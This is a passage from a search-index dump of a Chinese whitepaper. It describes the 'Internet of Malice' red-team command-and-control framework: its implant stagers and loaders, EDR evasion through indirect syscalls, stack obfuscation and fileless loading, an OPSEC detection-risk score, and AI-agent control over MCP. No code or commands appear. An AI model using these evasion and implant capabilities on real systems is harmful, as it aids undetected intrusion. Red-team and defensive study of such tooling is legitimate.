TTPs\uff0c\u5305\u62ec\u9690\u79d8\u901a\u4fe1\u3001\u8fdb\u7a0b\u6ce8\u5165\u548c\u6301\u4e45\u5316\u9a7b\u7559\u3002</li> <li>\u7075\u6d3b\u6027\u548c\u53ef\u6269\u5c55\u6027\uff1a\u652f\u6301\u6839\u636e\u4f01\u4e1a\u7279\u5b9a\u9700\u6c42\u5b9a\u5236\u529f\u80fd\uff0c\u9002\u5e94\u591a\u6837\u5316\u7684\u7f51\u7edc\u73af\u5883\u3002</li> <li>\u64cd\u4f5c\u5b89\u5168\u6027\uff08OPSEC\uff09\uff1a\u5728\u6a21\u62df\u653b\u51fb\u65f6\u6700\u5927\u9650\u5ea6\u964d\u4f4e\u66b4\u9732\u98ce\u9669\uff0c\u907f\u514d\u89e6\u53d1\u5b89\u5168\u8bbe\u5907\u7684\u8b66\u62a5\u3002</li> <li>\u8de8\u5e73\u53f0\u652f\u6301\uff1a\u8986\u76d6\u4e3b\u6d41\u64cd\u4f5c\u7cfb\u7edf\uff08\u5982 Windows\u3001Linux \u548c macOS\uff09\uff0c\u786e\u4fdd\u5168\u9762\u6d4b\u8bd5\u80fd\u529b\u3002</li> <li>\u793e\u533a\u4e0e\u751f\u6001\u652f\u6301\uff1a\u6574\u5408\u73b0\u6709\u7ea2\u961f\u5de5\u5177\u751f\u6001\uff08\u5982 CobaltStrike BOF \u548c Sliver Armory\uff09\uff0c\u51cf\u5c11\u5b66\u4e60\u66f2\u7ebf\u5e76\u63d0\u5347\u6548\u7387\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u7ea2\u961f\u7684\u9700\u6c42","title":"\u7ea2\u961f\u7684\u9700\u6c42","text":"<p>\u7ea2\u961f\u662f\u66f4\u76f4\u63a5\u7684\u9700\u6c42\u8005\uff0c\u5927\u591a\u6570red team\u9762\u4e34\u7740\u57fa\u7840\u8bbe\u65bd\u532e\u4e4f\u3001\u6280\u672f\u79ef\u7d2f\u96be\u4ee5\u8fed\u4ee3\u3001OPSEC\u843d\u540e\u7684\u95ee\u9898\u3002 \u800c\u6700\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848\u662f\u901a\u8fc7\u4fee\u6539\u5f00\u6e90\u7684\u5de5\u5177\uff0c \u9010\u6e10\u79ef\u7d2f\u6210\u5185\u90e8\u7684\u6b66\u5668\u5e93\uff0c\u8fd9\u9700\u8981\u6781\u5f3a\u7684\u4eba\u529b\u6295\u5165\u4e0e\u65f6\u95f4\u79ef\u7d2f\u3002 \u800cIoM\u5c06\u63d0\u4f9b\u4e00\u5957\u53ef\u4ee5\u6301\u7eed\u6539\u8fdb\u3001\u6280\u672f\u5148\u8fdb\u3001\u9ad8\u5ea6\u89e3\u8026\u7684\u89e3\u51b3\u65b9\u6848\u3002 \u8ba9\u7ea2\u961f\u80fd\u62e5\u6709\u4e00\u5957\u57fa\u7840\u8bbe\u65bd\u7684\u5e95\u5ea7\u3002</p> <ul> <li>\u9ad8\u5bf9\u6297\u6027\uff1a IoM\u957f\u671f\u81f4\u529b\u4e8eEDR\u3001NDR\u7b49\u8bbe\u5907\u7684\u5bf9\u6297\uff0c \u6709\u6781\u4e3a\u4e30\u5bcc\u7684\u6280\u672f\u79ef\u7d2f\u4e0e\u65b9\u6848\u6c89\u6dc0</li> <li>\u5f00\u7bb1\u5373\u7528\uff1a \u5c06\u590d\u6742\u7684\u6280\u672f\u5305\u88c5\u4e3a\u6b66\u5668\uff0c \u7ecf\u8fc7\u7b80\u5355\u7684\u57f9\u8bad\u5373\u53ef\u4e0a\u624b</li> <li>\u6301\u7eed\u6539\u8fdb\uff1a \u53ef\u62d3\u5c55\u6027\u4f5c\u4e3aIoM\u6838\u5fc3\u8bbe\u8ba1\u7406\u5ff5\uff0c \u9002\u5408\u4e0d\u540c\u573a\u666f\u7684\u7528\u6237\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u6301\u7eed\u6539\u8fdb</li> <li>\u9ad8\u5ea6\u5b9a\u5236\u5316\uff1a \u6211\u4eec\u62e5\u6709\u7ecf\u9a8c\u4e30\u5bcc\u7684\u7814\u53d1\u56e2\u961f\uff0c \u6301\u7eed\u6539\u8fdbIoM\u4ee5\u53ca\u63d0\u4f9b\u5b9a\u5236\u5316\u5f00\u53d1\u670d\u52a1\uff0c\u53ea\u9700\u8981\u6700\u5c0f\u7684\u6210\u672c\u5373\u53ef\u83b7\u5f97\u6700\u5148\u8fdb\u7684\u529f\u80fd\u3002 </li> </ul>"},{"location":"blog/whitepaper/IoM/#\u9762\u5411ai","title":"\u9762\u5411AI","text":"<p>IoM\u91c7\u7528\u4e86\u5f00\u653e\u7684\u6280\u672f\u67b6\u6784\uff0c\u5728v0.1.0\u7248\u672c\u4e2d\u63a5\u5165\u4e86MCP\uff0c\u5e76\u4e14\u57fa\u4e8eVSCode extension\u5b9e\u73b0\u4e86\u6211\u4eec\u7684GUI\u3002 \u73b0\u5728\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7VSCode\u4e0a\u7684AI\u63d2\u4ef6\u63a5\u7ba1IoM\u3002</p> <ul> <li>AI chat\uff0c \u57fa\u4e8e\u6211\u4eec\u7684\u6587\u6863\u81ea\u52a8\u56de\u7b54</li> <li>AI agent\uff0c \u57fa\u4e8eMCP\u63a5\u7ba1IoM\u5b9e\u73b0\u81ea\u7136\u8bed\u8a00\u9a71\u52a8\u7684\u81ea\u52a8\u5316\u64cd\u4f5c</li> <li>AI coding\uff0c \u57fa\u4e8eVSCoding\u7684AI\u7f16\u7a0b\u63d2\u4ef6\uff0c\u81ea\u52a8\u7f16\u5199\u63d2\u4ef6\uff0c\u53ef\u4ee5\u81ea\u52a8\u5316\u7f16\u5199\u4ee3\u7801\u7f16\u8bd1\u540e\u901a\u8fc7implant\u6267\u884c</li> </ul> <p>IoM \u6b63\u662f\u4e3a\u6ee1\u8db3\u8fd9\u4e9b\u9700\u6c42\u800c\u8bbe\u8ba1\u7684\u65b0\u4e00\u4ee3\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\u3002</p>"},{"location":"blog/whitepaper/IoM/#\u6280\u672f\u67b6\u6784","title":"\u6280\u672f\u67b6\u6784","text":""},{"location":"blog/whitepaper/IoM/#\u8bbe\u8ba1\u7406\u5ff5","title":"\u8bbe\u8ba1\u7406\u5ff5","text":"<p>IoM \u7684\u8bbe\u8ba1\u56f4\u7ed5\u4ee5\u4e0b\u4e09\u5927\u652f\u67f1\u5c55\u5f00\u5339\u914d</p> <ol> <li>\u6a21\u5757\u5316\u4e0e\u53ef\u6269\u5c55\u6027     IoM\u7684\u6a21\u5757\u5316\u8bbe\u8ba1\u5141\u8bb8\u7528\u6237\u6839\u636e\u4efb\u52a1\u9700\u6c42\u52a8\u6001\u52a0\u8f7d\u6216\u5b9a\u5236\u529f\u80fd\u6a21\u5757\uff0c\u786e\u4fdd\u5728\u4e0d\u540c\u573a\u666f\u4e0b\u7684\u7075\u6d3b\u5e94\u7528\uff0c\u540c\u65f6\u652f\u6301Rust\u8bed\u8a00\u7684\u8de8\u5e73\u53f0\u7f16\u8bd1\u80fd\u529b\uff0c\u63d0\u4f9b\u65e0\u4e0e\u4f26\u6bd4\u7684\u5b9a\u5236\u81ea\u7531\u5ea6\u3002</li> <li>\u64cd\u4f5c\u5b89\u5168\u6027\uff08OPSEC\uff09\u4f18\u5148     IoM \u5f15\u5165\u57fa\u4e8e ATT&amp;CK \u6846\u67b6\u7684 OPSEC \u6a21\u578b\uff0c\u4ece\u66b4\u9732\u5ea6\u3001\u75d5\u8ff9\u3001\u68c0\u6d4b\u53ef\u80fd\u6027\u548c\u540e\u679c\u56db\u4e2a\u7ef4\u5ea6\u8bc4\u4f30\u64cd\u4f5c\u98ce\u9669\uff0c\u5e2e\u52a9\u7528\u6237\u5728\u6a21\u62df\u653b\u51fb\u65f6\u4fdd\u6301\u9690\u853d\u6027\u3002</li> <li>\u8de8\u5e73\u53f0\u4e0e\u751f\u6001\u517c\u5bb9     IoM \u652f\u6301\u591a\u64cd\u4f5c\u7cfb\u7edf\u548c\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u517c\u5bb9\u4e3b\u6d41\u7ea2\u961f\u5de5\u5177\u7684\u63d2\u4ef6\u751f\u6001\uff08\u5982 CobaltStrike \u7684 BOF / Assembly \u548c Sliver \u7684 Armory\uff09\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u65e0\u7f1d\u7684\u8fc1\u79fb\u548c\u4f7f\u7528\u4f53\u9a8c\u3002</li> </ol>"},{"location":"blog/whitepaper/IoM/#\u67b6\u6784\u6982\u8ff0","title":"\u67b6\u6784\u6982\u8ff0","text":"<p>Internet of Malice (IoM) \u662f\u4e00\u5957\u6a21\u5757\u5316\u3001\u89e3\u8026\u7684\u547d\u4ee4\u4e0e\u63a7\u5236 (C2) \u6846\u67b6\uff0c\u4e13\u4e3a\u4f01\u4e1a\u84dd\u519b\u8bbe\u8ba1\uff0c\u7528\u4e8e\u6a21\u62df\u9ad8\u7ea7\u5a01\u80c1\uff0c\u6d4b\u8bd5\u9632\u5fa1\u80fd\u529b\u5e76\u63d0\u5347\u5b89\u5168\u6001\u52bf\u3002\u5176\u67b6\u6784\u7531\u56db\u4e2a\u6838\u5fc3\u7ec4\u4ef6\u7ec4\u6210\uff1a\u670d\u52a1\u5668 (Server)\u3001\u76d1\u542c\u5668 (Listener)\u3001\u690d\u5165\u7269 (Implant) \u548c \u5ba2\u6237\u7aef (Client)\uff0c\u901a\u8fc7\u9ad8\u6548\u901a\u4fe1\u534f\u8bae\u534f\u4f5c\uff0c\u786e\u4fdd\u7075\u6d3b\u6027\u548c\u64cd\u4f5c\u5b89\u5168\u6027\u3002\u6240\u6709\u7ec4\u4ef6\u5747\u89e3\u8026\u8bbe\u8ba1\uff0c\u652f\u6301\u5206\u5e03\u5f0f\u90e8\u7f72\u3002</p>"},{"location":"blog/whitepaper/IoM/#\u670d\u52a1\u5668-server","title":"\u670d\u52a1\u5668 (Server)","text":"<ul> <li>\u901a\u4fe1\uff1a\u901a\u8fc7 gRPC \u5b9e\u73b0\u4e0e\u5ba2\u6237\u7aef\u7684\u9ad8\u6548\u3001\u5b89\u5168\u901a\u4fe1\u3002</li> <li>\u5b58\u50a8\uff1a\u4f7f\u7528\u6301\u4e45\u5316\u6570\u636e\u5e93\u786e\u4fdd\u64cd\u4f5c\u53ef\u8ffd\u6eaf\u3002</li> <li>\u914d\u7f6e\uff1a\u652f\u6301\u7edf\u4e00\u914d\u7f6e\u6587\u4ef6\uff0c\u7b80\u5316\u90e8\u7f72\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u76d1\u542c\u5668-listener","title":"\u76d1\u542c\u5668 (Listener)","text":"<ul> <li>\u5206\u5e03\u5f0f\u90e8\u7f72\uff1a\u72ec\u7acb\u4e8e\u670d\u52a1\u5668\uff0c\u5206\u5e03\u5f0f\u90e8\u7f72\u3002</li> <li>\u7ba1\u9053 (Pipeline)\uff1a\u652f\u6301\u4efb\u610f\u534f\u8bae\u7684\u76d1\u542c\u5668\uff0c\u9002\u914d TCP\u3001TLS\u3001HTTP \u7b49\u534f\u8bae\u3002</li> <li>\u89e3\u6790\u5668 (Parser)\uff1a\u81ea\u5b9a\u4e49\u534f\u8bae\u89e3\u6790\uff0c\u652f\u6301\u7b2c\u4e09\u65b9 C2 \u96c6\u6210\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u690d\u5165\u7269-implant","title":"\u690d\u5165\u7269 (Implant)","text":"<ul> <li>\u8de8\u5e73\u53f0\uff1a\u6807\u51c6\u652f\u6301 Windows\u3001Linux\u3001macOS\u3002</li> <li>OPSEC \u5de5\u5177\uff1a\u63d0\u4f9b\u95f4\u63a5\u7cfb\u7edf\u8c03\u7528\u3001\u5806\u6808\u6df7\u6dc6\uff0c\u65e0\u6587\u4ef6\u653b\u51fb\u7b49\u529f\u80fd\u3002</li> <li>\u52a8\u6001\u6a21\u5757\uff1a\u8fd0\u884c\u65f6\u70ed\u52a0\u8f7d\u6a21\u5757\uff0c\u6700\u5c0f\u5316\u9759\u6001\u68c0\u6d4b\u7279\u5f81\u3002</li> <li>\u81ea\u52a8\u5316\u7f16\u8bd1: \u652f\u6301\u57fa\u4e8edocker\u4e0egithub action\u7684\u81ea\u52a8\u5316\u7f16\u8bd1</li> <li>\u6a21\u5757\u5316\u8bbe\u8ba1\uff1a\u5982\u540c\u4e50\u9ad8\u4e00\u822c\uff0c \u51e0\u4e4e\u6240\u6709\u7684\u529f\u80fd\u90fd\u53ef\u4ee5\u62c6\u5378\uff0c\u7ec4\u88c5\uff0c\u91cd\u8f7d\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u5ba2\u6237\u7aef-client","title":"\u5ba2\u6237\u7aef (Client)","text":"<ul> <li>\u754c\u9762\uff1a\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u57fa\u4e8eVSCode Extension\u7684\u56fe\u5f62\u5316\u754c\u9762\u3002</li> <li>\u63d2\u4ef6\u7cfb\u7edf\uff1a\u652f\u6301\u57fa\u4e8e Lua \u548c Go\u5b9e\u73b0\u7684\u63d2\u4ef6\uff0c\u63d0\u4f9b\u4e30\u5bcc\u5185\u7f6e\u51fd\u6570\u4e0e\u63d2\u4ef6\u5305\u3002</li> <li>\u63d2\u4ef6\u4ed3\u5e93\uff1a\u793e\u533a\u9a71\u52a8\u7684\u63d2\u4ef6\u751f\u6001\u7ba1\u7406\uff08github.com/chainreactors/mals\uff09\uff0c\u652f\u6301\u4e00\u952e\u5b89\u88c5</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u7f51\u7edc\u67b6\u6784","title":"\u7f51\u7edc\u67b6\u6784","text":"<p>\u91c7\u7528\u4e86\u5206\u5e03\u5f0f Listener\u4e0e\u591a\u534f\u8baepipeline\u3002</p> <p>\u5ba2\u6237\u7aef\u901a\u8fc7 gRPC \u4e0e\u670d\u52a1\u5668\u5efa\u7acb\u901a\u4fe1\uff0c\u670d\u52a1\u5668\u518d\u5229\u7528\u81ea\u5b9a\u4e49\u534f\u8bae\u4e0e\u5206\u5e03\u5f0f Listener \u8fdb\u884c\u4ea4\u4e92\uff0c\u6700\u7ec8\u7531 Listener \u4e0e\u690d\u5165\u7269\uff08Implant\uff09\u5b8c\u6210\u6570\u636e\u4f20\u9012\u3002\u8fd9\u79cd\u5206\u5c42\u901a\u4fe1\u8bbe\u8ba1\u4e0d\u4ec5\u63d0\u5347\u4e86\u6570\u636e\u6d41\u7684\u9ad8\u6548\u6027\uff0c\u8fd8\u901a\u8fc7\u534f\u8bae\u9694\u79bb\u548c\u5206\u5e03\u5f0f\u90e8\u7f72\u589e\u5f3a\u4e86\u5b89\u5168\u6027\u3002</p> <ul> <li>\u5206\u5e03\u5f0f Listener\uff1a\u7cfb\u7edf\u91c7\u7528\u89e3\u8026\u7684 Listener \u8bbe\u8ba1\uff0c\u652f\u6301\u5206\u5e03\u5f0f\u90e8\u7f72\u3002\u6bcf\u4e2a Listener \u53ef\u4ee5\u72ec\u7acb\u8fd0\u884c\u4e8e\u4e0d\u540c\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u5e76\u901a\u8fc7\u81ea\u5b9a\u4e49\u534f\u8bae\u4e0e\u670d\u52a1\u5668\u8fdb\u884c\u901a\u4fe1\u3002\u8fd9\u79cd\u8bbe\u8ba1\u80fd\u591f\u5728\u590d\u6742\u7684\u7f51\u7edc\u62d3\u6251\u4e2d\u63d0\u4f9b\u7075\u6d3b\u7684\u901a\u4fe1\u8def\u5f84\uff0c\u9002\u5e94\u591a\u6837\u5316\u7684\u90e8\u7f72\u9700\u6c42\u3002</li> <li>REM \uff08\u7f51\u7edc\u5de5\u5177\u5305\uff09\uff1a\u901a\u8fc7rem\u53ef\u4ee5\u5b9e\u73b0\u6b63\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1\uff0c \u6b63\u53cd\u5411\u4ee3\u7406\uff0c\u7ea7\u8054\uff0c \u6d41\u91cf\u52a0\u5bc6\u6df7\u6dc6\uff0cLOLC2(\u53ef\u4fe1\u96a7\u9053)\u7b49\u7b49\u529f\u80fd\u3002\u6253\u901aClient\uff0c Listener\uff0c Implant\u4e09\u7aef\u7684\u7f51\u7edc\uff0c\u5b9e\u73b0\u76f8\u4e92\u4e4b\u95f4\u7684\u4ee3\u7406\uff0c\u7aef\u53e3\u8f6c\u53d1\u7b49\u529f\u80fd\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#implant-\u67b6\u6784","title":"implant \u67b6\u6784","text":"<p>implant \u67b6\u6784\u662f\u7cfb\u7edf\u7684\u7ec8\u7aef\u6267\u884c\u5c42\uff0c\u4e13\u6ce8\u4e8e\u8f7b\u91cf\u5316\u3001\u6a21\u5757\u5316\u548c\u9ad8\u5bf9\u6297\u6027\u8bbe\u8ba1\uff0c\u4ee5\u6ee1\u8db3\u591a\u6837\u5316\u7684\u4efb\u52a1\u9700\u6c42\u3002</p> <ul> <li>malefic, \u4e3b\u7a0b\u5e8f, \u5305\u542b\u4e86beacon/bind\u4e24\u79cd\u6a21\u5f0f\u7684\u5b8c\u6574\u529f\u80fd</li> <li>malefic-mutant, \u7528\u6765\u5b9e\u73b0\u81ea\u52a8\u5316\u914d\u7f6emalefic\u7684\u5404\u79cd\u6761\u4ef6\u7f16\u8bd1\u4e0e\u7279\u6027, \u4ee5\u53ca\u751f\u6210shellcode, srdi\u7b49</li> <li>malefic-pulse, \u6700\u5c0f\u5316\u7684shellcode\u6a21\u677f, \u5bf9\u5e94CS\u7684artifact, \u80fd\u7f16\u8bd1\u51fa\u53ea\u67094kb\u7684\u4e0a\u7ebf\u9a6c, \u975e\u5e38\u9002\u5408\u88ab\u5404\u79cdloader\u52a0\u8f7d</li> <li>malefic-prelude, \u591a\u6bb5\u4e0a\u7ebf\u7684\u4e2d\u95f4\u9636\u6bb5, \u53ef\u4ee5\u5728\u8fd9\u91cc\u6309\u9700\u914d\u7f6e\u6743\u9650\u7ef4\u6301, \u53cd\u6c99\u7bb1, \u53cd\u8c03\u8bd5\u7b49\u529f\u80fd.</li> <li>malefic-srdi, \u81ea\u7814srdi\u6280\u672f, \u6700\u5927\u7a0b\u5ea6\u51cf\u5c11PE\u7279\u5f81</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u6838\u5fc3\u529f\u80fd","title":"\u6838\u5fc3\u529f\u80fd","text":"<p>\u6211\u4eec\u81ea\u7814\u4e86\u5927\u91cf\u5e95\u5c42\u6838\u5fc3\u6280\u672f\uff0c \u5305\u62ecOLLVM Packer\u3001\u81ea\u7814\u5806\u6808\u6df7\u6dc6\u3001\u81ea\u7814SystemCallGate\u3001Syscall Obfuscator\u3001\u81ea\u7814RDI\u3001\u81ea\u7814PIC loader\u3001\u5b8c\u5168\u53ef\u63a7\u7684\u6d41\u91cf\u4ee3\u7406\u6280\u672f\u7b49\u7b49\uff0c\u5bf9\u5927\u91cf\u6838\u5fc3\u6280\u672f\u91cd\u65b0\u5b9e\u73b0\u5e76\u5927\u5e45\u4f18\u5316\u4e0e\u6539\u8fdb\u3002\u91cd\u65b0\u67b6\u6784\u8d77\u4e00\u5957\u6280\u672f\u5e95\u5ea7\uff0c \u5e76\u5728\u6b64\u4e4b\u4e0a\u6301\u7eed\u8fed\u4ee3\uff0c\u5c06\u5927\u91cf\u4e00\u7ebf\u5bf9\u6297\u7ecf\u9a8c\u6e90\u6e90\u4e0d\u65ad\u6c89\u6dc0\u4e3a\u5de5\u7a0b\u5316\u57fa\u7840\u8bbe\u65bd\u3002 </p>"},{"location":"blog/whitepaper/IoM/#opsec-\u6a21\u578b","title":"OPSEC \u6a21\u578b","text":"<p>IoM \u7684\u64cd\u4f5c\u5b89\u5168\u6027 (OPSEC) \u6a21\u578b\u662f\u5176\u6838\u5fc3\u4f18\u52bf\u4e4b\u4e00\uff0c\u65e8\u5728\u5e2e\u52a9\u4f01\u4e1a\u84dd\u961f\u5728\u6a21\u62df\u9ad8\u7ea7\u5a01\u80c1\u65f6\u4fdd\u6301\u9690\u853d\u6027\u5e76\u964d\u4f4e\u68c0\u6d4b\u98ce\u9669\u3002\u8be5\u6a21\u578b\u57fa\u4e8e MITRE ATT&amp;CK \u6846\u67b6\uff0c\u4ece\u7aef\u4e0a\u5bf9\u6297\u548c\u6d41\u91cf\u5bf9\u6297\u4e24\u4e2a\u7ef4\u5ea6\u8bbe\u8ba1\uff0c\u63d0\u4f9b\u5168\u9762\u7684\u9690\u853d\u6027\u4fdd\u969c\u3002\u4ee5\u4e0b\u4e3a OPSEC \u6a21\u578b\u7684\u4f53\u7cfb\u7ed3\u6784\uff1a</p>"},{"location":"blog/whitepaper/IoM/#\u7aef\u4e0a\u5bf9\u6297","title":"\u7aef\u4e0a\u5bf9\u6297","text":"<ul> <li>\u9759\u6001\u7279\u5f81\u6df7\u6dc6\uff1a\u901a\u8fc7\u7f16\u8bd1\u65f6\u6761\u4ef6\u63a7\u5236\uff08\u5982 Rust \u7684 feature\uff09\u548c\u81ea\u5b9a\u4e49\u8d44\u6e90\uff08\u5982\u56fe\u6807\u3001PE \u5143\u6570\u636e\uff09\uff0cOLLVM\u7b49\u964d\u4f4e\u9759\u6001\u5206\u6790\u7684\u53ef\u68c0\u6d4b\u6027\u3002</li> <li>\u7cfb\u7edf\u8c03\u7528\uff1a\u95f4\u63a5 syscall  , \u5806\u6808\u6df7\u6dc6\u7b49\u624b\u6cd5\u5b9e\u73b0\u7ed5\u8fc7 EDR \u76d1\u63a7\uff0c\u63d0\u5347\u6267\u884c\u9690\u853d\u6027\u3002</li> <li>\u5185\u5b58\u65e0\u6587\u4ef6\u6267\u884c\uff1a\u652f\u6301\u53cd\u5c04\u52a0\u8f7d\uff08\u5982 BOF\u3001DLL\u3001PE\u3001Shellcode\u3001CLR\u7b49\uff09\u907f\u514d\u6587\u4ef6\u843d\u5730\uff0c\u51cf\u5c11\u75d5\u8ff9\u3002</li> <li>\u6a21\u5757\u5316\u70ed\u63d2\u62d4\uff1a\u6240\u6709\u529f\u80fd\u90fd\u53ef\u4ee5\u901a\u8fc7\u6a21\u5757\u5316\u70ed\u52a0\u8f7d\uff0c\u81ea\u5b9a\u4e49\u591a\u9636\u6bb5\u52a0\u8f7d\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u6d41\u91cf\u5bf9\u6297","title":"\u6d41\u91cf\u5bf9\u6297","text":"<ul> <li>\u52a0\u5bc6\u4e0e\u6df7\u6dc6\uff1a \u5b9a\u5236\u5316\u6d41\u91cf\u4fe1\u9053\u4e0e\u52a0\u5bc6\u65b9\u5f0f\uff0c\u5bc6\u7801\u5b66\u524d\u5411/\u540e\u5411\u5b89\u5168\u3002</li> <li>\u52a8\u6001\uff1a\u501f\u52a9 Listener \u7684 Parser \u673a\u5236\uff0c\u652f\u6301\u591a\u534f\u8bae\u4e0a\u7ebf(TCP,ICMP,DNS\u7b49) \uff0c\u589e\u5f3a\u901a\u4fe1\u7075\u6d3b\u6027\u3002</li> <li>\u6d41\u91cf\u4fe1\u9053/\u4ee3\u7406\uff1a\u7ed3\u5408 rem \u4ee3\u7406\u5de5\u5177\uff0c\u5b9e\u73b0\u4efb\u610f\u6d41\u91cf\u7279\u5f81\u4e0e\u4fe1\u9053\u7684\u5b9a\u5236\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#opsec\u8bc4\u4f30","title":"OPSEC\u8bc4\u4f30","text":"<p>OPSEC \u6a21\u578b\u901a\u8fc7\u4ee5\u4e0b\u56db\u4e2a\u7ef4\u5ea6\u91cf\u5316\u64cd\u4f5c\u98ce\u9669\uff0c\u8bc4\u5206\u8303\u56f4\u4e3a 0\uff08\u9ad8\u98ce\u9669\uff09\u81f3 10\uff08\u6781\u4f4e\u98ce\u9669\uff09\uff1a</p> \u7ef4\u5ea6 \u5b9a\u4e49 \u8bc4\u4f30\u8981\u70b9 \u66b4\u9732\u5ea6 \u64cd\u4f5c\u88ab\u68c0\u6d4b\u7684\u7a0b\u5ea6 \u65b0\u8fdb\u7a0b\u521b\u5efa\u3001\u7f51\u7edc\u8fde\u63a5\u3001API \u8c03\u7528\u7b49 \u75d5\u8ff9 \u64cd\u4f5c\u7559\u4e0b\u7684\u53ef\u8ffd\u8e2a\u75d5\u8ff9 \u65e5\u5fd7\u8bb0\u5f55\u3001\u6587\u4ef6\u6b8b\u7559 \u68c0\u6d4b\u53ef\u80fd\u6027 \u88ab\u73b0\u6709\u5b89\u5168\u8bbe\u5907\u8bc6\u522b\u7684\u6982\u7387 EDR/NDR \u7684\u68c0\u6d4b\u80fd\u529b\u3001\u884c\u4e3a\u7279\u5f81\u590d\u6742\u5ea6 \u540e\u679c \u64cd\u4f5c\u5931\u8d25\u53ef\u80fd\u5e26\u6765\u7684\u5f71\u54cd \u662f\u5426\u5f71\u54cd\u957f\u671f\u6f5c\u4f0f\u6216\u4efb\u52a1\u76ee\u6807 <p>\u901a\u8fc7\u8bc4\u5206\uff080-10 \u5206\uff0c10 \u5206\u4e3a\u6700\u5b89\u5168\uff09\uff0c\u7528\u6237\u53ef\u4ee5\u91cf\u5316\u64cd\u4f5c\u98ce\u9669\u5e76\u4f18\u5316\u653b\u51fb\u7b56\u7565\u3002\u4f8b\u5982\uff0c\u8bc4\u5206\u8fbe\u5230 9.0-10 \u7684\u64cd\u4f5c\u88ab\u5b9a\u4e49\u4e3a\u201cOPSEC \u7ea7\u201d\uff0c\u51e0\u4e4e\u65e0\u68c0\u6d4b\u98ce\u9669\u4e14\u65e0\u660e\u663e\u540e\u679c\u3002</p> <p>\u8fd9\u4e00\u6a21\u578b\u4e0d\u4ec5\u4e3a\u84dd\u961f\u63d0\u4f9b\u4e86\u6280\u672f\u652f\u6301\uff0c\u8fd8\u901a\u8fc7\u7ed3\u6784\u5316\u8bc4\u4f30\u6307\u5bfc\u653b\u51fb\u7b56\u7565\u4f18\u5316\uff0c\u786e\u4fdd\u6a21\u62df\u884c\u4e3a\u65e2\u771f\u5b9e\u53c8\u5b89\u5168\u3002IoM \u7684 OPSEC \u8bbe\u8ba1\u4f7f\u5176\u5728\u5bf9\u6297\u9ad8\u7ea7\u68c0\u6d4b\u6280\u672f\uff08\u5982 EDR\u3001NDR \u548c\u884c\u4e3a\u5206\u6790\uff09\u65f6\u5177\u5907\u663e\u8457\u4f18\u52bf\u3002</p>"},{"location":"blog/whitepaper/IoM/#\u751f\u6001\u517c\u5bb9\u6027","title":"\u751f\u6001\u517c\u5bb9\u6027","text":"<p>IoM \u901a\u8fc7\u5e7f\u6cdb\u7684\u517c\u5bb9\u6027\u8bbe\u8ba1\uff0c\u4e0e\u4e3b\u6d41\u5b89\u5168\u5de5\u5177\u65e0\u7f1d\u96c6\u6210\uff0c\u63d0\u5347\u7528\u6237\u7075\u6d3b\u6027\u548c\u6548\u7387\u3002\u5176\u6838\u5fc3\u517c\u5bb9\u6027\u5305\u62ec\uff1a</p> \u517c\u5bb9\u751f\u6001 \u5b9e\u73b0\u65b9\u5f0f IoM sliver Cobaltstrike BOF \u57fa\u4e8erust\u81ea\u7814\u7684COFF loader \u2705 \u2705 \u2705 EXE/DLL \u57fa\u4e8erust\u81ea\u7814\u7684PIC loader \u2705 \u274c \u274c UDRL \u57fa\u4e8erust\u81ea\u7814\u7684RDI loader \u2705 donut \u2705 Shellcode Shellcode\u52a0\u8f7d\uff0c\u53ef\u81ea\u5b9a\u4e49\u7684\u8fdb\u7a0b\u6ce8\u5165\u65b9\u5f0f \u2705 \u2705 \u2705 C# Assembly CLR .NET \u7a0b\u5e8f\u53cd\u5c04\u8bb0\u8f7d \u2705 \u2705 \u2705 Unmanned Powershell CLR powershell\u53cd\u5c04\u52a0\u8f7d \u2705 \u274c \u2705 Sliver Armory client\u5b9e\u73b0\u4e86sliver armory \u2705 \u2705 \u274c <p>IoM \u7684\u751f\u6001\u517c\u5bb9\u6027\u662f\u5176\u8bbe\u8ba1\u4e2d\u7684\u4e00\u5927\u4eae\u70b9\uff0c\u65e8\u5728\u901a\u8fc7\u4e0e\u73b0\u6709\u5de5\u5177\u548c\u751f\u6001\u7cfb\u7edf\u7684\u65e0\u7f1d\u5bf9\u63a5\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u9ad8\u6548\u3001\u7075\u6d3b\u7684\u4f7f\u7528\u4f53\u9a8c\u3002\u901a\u8fc7\u652f\u6301\u591a\u79cd\u4e3b\u6d41\u5b89\u5168\u5de5\u5177\u548c\u6a21\u5757\u7c7b\u578b\uff0cIoM \u4e0d\u4ec5\u80fd\u591f\u5feb\u901f\u878d\u5165\u7528\u6237\u73b0\u6709\u7684\u5de5\u4f5c\u6d41\u7a0b\uff0c\u8fd8\u80fd\u663e\u8457\u63d0\u5347\u529f\u80fd\u7684\u4e30\u5bcc\u6027\u548c\u5b9e\u7528\u6027\u3002 </p> <p>\u8fd9\u79cd\u5e7f\u6cdb\u7684\u517c\u5bb9\u6027\u8bbe\u8ba1\u4f7f\u5f97 IoM \u80fd\u591f\u9002\u5e94\u4e0d\u540c\u7684\u5e94\u7528\u573a\u666f\uff0c\u65e0\u8bba\u662f\u7ea2\u961f\u6f14\u7ec3\u3001\u5b89\u5168\u8bc4\u4f30\u8fd8\u662f\u6280\u672f\u5f00\u53d1\uff0c\u7528\u6237\u90fd\u80fd\u4f9d\u6258\u73b0\u6709\u8d44\u6e90\u5feb\u901f\u4e0a\u624b\uff0c\u540c\u65f6\u4eab\u53d7 IoM 